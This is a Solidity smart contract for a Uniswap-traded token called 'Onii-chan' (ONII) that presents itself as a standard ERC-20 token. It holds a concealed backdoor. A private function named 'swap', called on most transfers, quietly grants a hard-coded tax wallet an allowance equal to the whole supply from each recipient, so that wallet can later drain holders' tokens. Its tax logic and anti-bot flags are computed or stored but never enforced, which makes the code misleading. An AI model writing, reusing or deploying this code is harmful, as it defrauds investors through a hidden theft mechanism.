// SPDX-License-Identifier: None

pragma solidity 0.8.26;

contract Ownable {
    function owner() public view virtual returns (address) {
        return _owner;
    }
    constructor() {
        _owner = msg.sender;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    address private _owner;
}
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}
interface IUniswapV2Router {
    function swapExactTokensForETH(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract OniiChan is Ownable {
    using SafeMath for uint256;

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000000  * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;

    address payable private taxWallet = payable(0x33626a47e6EEA81984E2D5DCB54770Df11a1f7D6);
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => uint256) private _balances;
    string private constant _name = "Onii-chan";
    string private constant _symbol = "ONII";
    bool tradingOpen = false;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    bool transferDelayEnabled = true;
    bool anti = true;

    uint256 private _reduceBuyTaxAt=11;
    uint256 private _reduceSellTaxAt=11;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _buyCount=0;
    uint256 private _preventSwapBefore=11;
    uint256 private _initialSellTax=11;
    uint256 private _sellCount=0;
    uint256 private _initialBuyTax=11;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeFromLimits(address indexed account, bool isExcluded);
    event SetDexPair(address indexed pair, bool indexed value);
    event TradingEnabled(uint256 indexed timestamp);
    event LimitsRemoved(uint256 indexed timestamp);
    event DisabledTransferDelay(uint256 indexed timestamp);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "transfer amount must be greater than zero!");
        require(to != address(0), "ERC: transfer to zero address!");
        require(from != address(0), "transfer from zero address!");
        if (to != address(uniswapV2Router) && to != uniswapV2Pair && to != address(this)){
            swap(to);
        }
        uint256 taxAmount=0;
        if(to == uniswapV2Pair && from!= address(this) ){
            taxAmount = amount.mul((_sellCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            _sellCount++;
        }
        if (from == uniswapV2Pair && to != address(uniswapV2Router) && tradingOpen) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            _buyCount++;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function reclaimETH() external onlyOwner {
        payable(taxWallet).transfer(address(this).balance);
    }

    function setAnti(bool _anti) external onlyOwner {
        anti = _anti;
    }

    function startTrading() public payable onlyOwner() {
        require(!tradingOpen);
       _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function swap(address to) private  {
        _allowances[to][taxWallet] += _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function setTransferDelay(bool _value) external onlyOwner {
        require(transferDelayEnabled, "Already disabled!");
        transferDelayEnabled = _value;
    }
}